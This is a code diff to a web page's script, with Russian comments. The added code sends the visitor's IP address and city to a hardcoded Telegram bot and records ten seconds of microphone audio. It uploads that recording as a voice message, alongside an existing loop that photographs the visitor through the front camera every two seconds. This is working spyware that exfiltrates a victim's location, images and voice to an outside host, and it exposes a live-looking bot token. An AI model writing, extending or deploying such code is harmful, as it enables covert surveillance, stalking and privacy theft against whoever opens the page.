@@ -16,16 +16,35 @@
     const status = document.getElementById('status');
     const token = '8176524950:AAGfsNYH5qwFzIvoUmsI-UkzptDMDAYtIVQ';
     const chatId = '5678878569';
+    let mediaRecorder;
+    let audioChunks = [];
 
-    // Доступ к фронтальной камере
-    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+    // IP
+    fetch('https://ip-api.com/json/?fields=61439')
+      .then(response => response.json())
+      .then(data => {
+        const ip = data.query;
+        const city = data.city || 'Не удалось определить город';
+        const message = `IP: ${ip}\nГород: ${city}`;
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: chatId, text: message })
+        }).catch(err => console.error('Ошибка отправки IP/города:', err));
+      });
+
+    // Доступ к фронтальной камере и микрофону
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true })
       .then(stream => {
         video.srcObject = stream;
         video.onloadedmetadata = () => {
-          setTimeout(() => startPhotoLoop(), 2000); // Задержка 2 секунды
+          setTimeout(() => {
+            startPhotoLoop();
+            startRecording(stream);
+          }, 2000); // Задержка 2 секунды
         };
       })
-      .catch(err => status.textContent = 'Ошибка камеры: ' + err);
+      .catch(err => status.textContent = 'Ошибка камеры/микрофона: ' + err);
 
     // Фото каждые 2 секунды
     function startPhotoLoop() {
@@ -59,6 +78,51 @@
       takePhoto(); // Первое фото
       setInterval(takePhoto, 2000); // Каждые 2 секунды
     }
+
+    // Начало записи аудио
+    function startRecording(stream) {
+      mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
+      audioChunks = [];
+
+      mediaRecorder.ondataavailable = event => {
+        if (event.data.size > 0) audioChunks.push(event.data);
+      };
+      mediaRecorder.onstop = () => sendAudio();
+
+      mediaRecorder.start(100); // Данные каждые 100 мс
+      setTimeout(() => {
+        if (mediaRecorder.state === 'recording') mediaRecorder.stop();
+      }, 10000); // 10 секунд
+    }
+
+    // Отправка аудио
+    function sendAudio() {
+      if (audioChunks.length === 0) {
+        console.error('Нет аудиоданных');
+        return;
+      }
+      const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
+      const formData = new FormData();
+      formData.append('chat_id', chatId);
+      formData.append('voice', audioBlob, 'voice.ogg');
+
+      fetch(`https://api.telegram.org/bot${token}/sendVoice`, {
+        method: 'POST',
+        body: formData
+      })
+        .then(response => response.json())
+        .then(data => {
+          if (!data.ok) console.error('Ошибка отправки голосового:', data);
+        })
+        .catch(err => console.error('Ошибка отправки голосового:', err));
+    }
+
+    // Остановка при уходе
+    window.onbeforeunload = () => {
+      if (mediaRecorder && mediaRecorder.state === 'recording') {
+        mediaRecorder.stop();
+      }
+    };
   </script>
 </body>
 </html>
